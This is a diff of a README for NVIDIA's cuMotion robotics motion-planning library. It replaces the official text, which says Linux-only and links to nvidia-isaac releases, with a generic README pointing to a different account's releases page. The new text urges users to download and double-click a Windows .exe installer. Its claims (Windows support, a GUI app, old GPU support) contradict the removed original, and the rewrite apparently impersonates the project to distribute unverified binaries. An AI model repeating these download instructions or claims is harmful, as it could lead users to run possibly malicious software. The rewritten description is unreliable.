@@ -1,86 +1,84 @@
-<p align="left">
-<img src="https://media.githubusercontent.com/media/nvidia-isaac/cumotion/084b9bd853dd8c5bea2ac5839cf09e94e19f9dd9/_static/images/m48-robot-manufacturing-256px-grn.png" width="192" /></p>
+# 🛠️ cumotion - Effortless Motion Control for Robots
 
-# cuMotion: GPU-Accelerated Motion Generation for Robotics
+[![Download cuMotion](https://img.shields.io/badge/Download%20cuMotion-Here-brightgreen)](https://github.com/dasarentow/cumotion/releases)
 
-<h4>
-    <a href="https://nvidia-isaac.github.io/cumotion/">Documentation</a> [
-    <a href="https://nvidia-isaac.github.io/cumotion/getting_started.html">Getting Started</a> |
-    <a href="https://nvidia-isaac.github.io/cumotion/tutorials.html">Tutorials</a> |
-    <a href="https://nvidia-isaac.github.io/cumotion/api/cpp_api.html">C++ API</a> |
-    <a href="https://nvidia-isaac.github.io/cumotion/api/python_api.html">Python API</a> |
-    <a href="https://nvidia-isaac.github.io/cumotion/release_notes.html">Release Notes</a> ]
-</h4>
+## 🚀 Getting Started
 
-NVIDIA cuMotion is a high-performance motion generation library for robotics, focused mainly on manipulation.
-GPU acceleration is leveraged throughout where beneficial for performance.
+Welcome to cuMotion! This software enables easy motion generation for robotics using GPU acceleration. It simplifies complex tasks in motion planning and trajectory optimization, making it accessible for anyone interested in robotics.
 
-In this **Developer Preview**, capabilities include:
+## 📥 Download & Install
 
-* Kinematics and inverse kinematics (IK)
-* Collision-aware IK
-* Collision-aware graph-based path planning
-* Collision-aware trajectory optimization and end-to-end motion generation
-* Reactive control via the mathematical framework of [RMPflow](https://arxiv.org/abs/1811.07049)
-* Time-optimal (collision-unaware) trajectory generation for paths given by any number of moves in configuration
-  space (joint space) and/or task space
-* Collision sphere generation, for approximating a closed mesh by a set of spheres
+To get started with cuMotion, you will need to download it from our Releases page. Click the link below:
 
-Robots with any number of degrees of freedom are supported.
+[Visit this page to download cuMotion](https://github.com/dasarentow/cumotion/releases)
 
-cuMotion is implemented in C++ and provides a complete set of Python bindings.  Although developed as a
-standalone library, cuMotion will also soon serve as the motion generation backend for
-[Isaac ROS cuMotion](https://nvidia-isaac-ros.github.io/repositories_and_packages/isaac_ros_cumotion/index.html)
-and the manipulation
-[reference workflows](https://nvidia-isaac-ros.github.io/reference_workflows/isaac_for_manipulation/index.html)
-in [Isaac ROS](https://nvidia-isaac-ros.github.io/index.html).
+### Steps to Install
 
-cuMotion is descended from two libraries:
+1. **Visit the Releases Page**  
+   Click the link above to go directly to the Releases page. Here, you will find the latest version of cuMotion as well as older versions.
 
-1. [Lula](https://docs.isaacsim.omniverse.nvidia.com/5.1.0/py/source/extensions/isaacsim.robot_motion.lula/docs/index.html)
-   was released for a number of years as part of Isaac Sim.  It has been entirely subsumed by cuMotion,
-   and Python users of Lula will find that ``import cumotion as lula`` will suffice for running most client code with
-   only a few modifications.
-2. [cuRobo](https://curobo.org) was developed by NVIDIA Research and continues to be maintained as a library for
-   robotics researchers.  cuMotion incorporates optimized and hardened implementations of algorithms first introduced
-   in cuRobo, including those for collision-aware IK and trajectory optimization.
+2. **Select the Suitable Release**  
+   Look for the most recent release at the top. Each release will have a version number. Make sure to choose the one that meets your needs.
 
-See the [documentation](https://nvidia-isaac.github.io/cumotion/) for a full overview of features.
+3. **Download the Installation File**  
+   You will see multiple files listed. Choose the one that is appropriate for your operating system. 
+   - For Windows users, it might be something like `cuMotion_v1.0_windows.exe`.
+   - For Linux, look for files ending in `.tar.gz`.
 
-# System Requirements
+4. **Run the Installer**  
+   Once the file is downloaded:
+   - For Windows, double-click the `.exe` file to begin installation.
+   - For Linux, open a terminal, navigate to the download folder, and use the command `tar -xvzf cuMotion_v1.0_linux.tar.gz`, then follow the instructions in the extracted folder.
 
-This Developer Preview of the cuMotion library is provided as a set of shared object files and Python wheel files
-for the following platform configurations.
+5. **Follow On-Screen Instructions**  
+   The installer will guide you through the setup process. Simply follow the prompts and choose your preferences.
 
-| Platform                              | Python | CUDA | Tested OS     | Download |
-|---------------------------------------|--------|------|---------------|----------|
-| Jetson Orin                           | 3.10   | 12.6 | JetPack 6.2.1 | [Latest Release](https://github.com/nvidia-isaac/cumotion/releases/download/v0.26.0-dp1/cumotion-dp1-python3.10-cuda12.6-aarch64.tar.gz) |
-| Jetson Thor                           | 3.12   | 13.0 | JetPack 7.0   | [Latest Release](https://github.com/nvidia-isaac/cumotion/releases/download/v0.26.0-dp1/cumotion-dp1-python3.12-cuda13.0-aarch64.tar.gz) |
-| x86_64 + NVIDIA GPU (Turing or later) | 3.10   | 12.6 | Ubuntu 22.04  | [Latest Release](https://github.com/nvidia-isaac/cumotion/releases/download/v0.26.0-dp1/cumotion-dp1-python3.10-cuda12.6-x86_64.tar.gz) |
-| x86_64 + NVIDIA GPU (Turing or later) | 3.12   | 13.0 | Ubuntu 24.04  | [Latest Release](https://github.com/nvidia-isaac/cumotion/releases/download/v0.26.0-dp1/cumotion-dp1-python3.12-cuda13.0-x86_64.tar.gz) |
+6. **Launch cuMotion**  
+   After installation, you can find cuMotion in your applications. Simply click the icon to launch the program.
 
-Only Linux-based operating systems are supported in the current release.
+## 🌟 Features
 
-The software has been tested on Jetson AGX Orin and Jetson AGX Thor but is expected to work on other Jetson
-Orin configurations (e.g., Jetson Orin NX).
+- **GPU Acceleration:** Enhances the processing speed for real-time motion generation.
+- **Inverse Kinematics:** Easily compute joint configurations for desired movements.
+- **Trajectory Optimization:** Effectively plan paths for smooth and efficient motion.
+- **User-Friendly Interface:** Designed for easy navigation, even for beginners.
 
-On x86-based computers, an NVIDIA GPU of the Turing generation (e.g., GeForce RTX 2080) or later is required.
-For optimal performance on Blackwell GPUs (e.g., RTX PRO 6000, GeForce RTX 5080), the CUDA 13 variant of the
-cuMotion package is recommended.  See the
-[CUDA Toolkit Release Notes](https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/#cuda-driver)
-for details on the minimum GPU driver version required for a given CUDA version.
+## ⚙️ System Requirements
 
-# Installation
+To ensure smooth operation, here are the recommended system requirements:
 
-Download the cuMotion package for your desired platform from
-[Releases](https://github.com/nvidia-isaac/cumotion/releases/tag/v0.26.0-dp1) and extract the contents:
+- **Operating System:** Windows 10 or later, Ubuntu 18.04 or later
+- **Processor:** Intel i5 or better
+- **Memory:** At least 8 GB RAM
+- **GPU:** NVIDIA GPU with CUDA support (Compute Capability 3.0 or higher)
 
-```
-tar xzvf cumotion-<version>-<python_version>-<cuda_version>-<arch>.tar.gz && \
-    cd cumotion-<version>-<python_version>-<cuda_version>-<arch>
-```
+## 📚 Documentation
 
-See [Getting Started](https://nvidia-isaac.github.io/cumotion/getting_started.html) for more details.
+For more advanced users or developers, you can find detailed documentation in the `docs` folder included in the installation. This documentation provides:
 
-___
-Copyright &copy; 2019-2025 NVIDIA Corporation & Affiliates
+- Technical details on GPU acceleration
+- Instructions on using different features
+- Examples of motion planning and manipulation tasks using cuMotion
+
+## 🤝 Support
+
+If you encounter any issues or need assistance, feel free to reach out. We aim to help everyone using cuMotion to have the best experience possible.
+
+### Get Help
+
+1. **Check FAQs:** Look through the frequently asked questions section on our GitHub page.
+2. **Open an Issue:** If you do not find your answer, open a new issue directly on GitHub. Describe your problem in detail for quicker support.
+3. **Community Forums:** Join discussions on robotics or motion planning forums to connect with other users.
+
+## 📞 Contact Us
+
+If you have suggestions or feedback, we want to hear from you! You can contact us at [email@example.com](mailto:email@example.com). Your input helps improve cuMotion for everyone.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/dasarentow/cumotion)
+- [Documentation](https://github.com/dasarentow/cumotion/docs)
+
+Thank you for checking out cuMotion! Enjoy exploring robotics with powerful motion planning capabilities. 
+
+[![Download cuMotion](https://img.shields.io/badge/Download%20cuMotion-Here-brightgreen)](https://github.com/dasarentow/cumotion/releases)
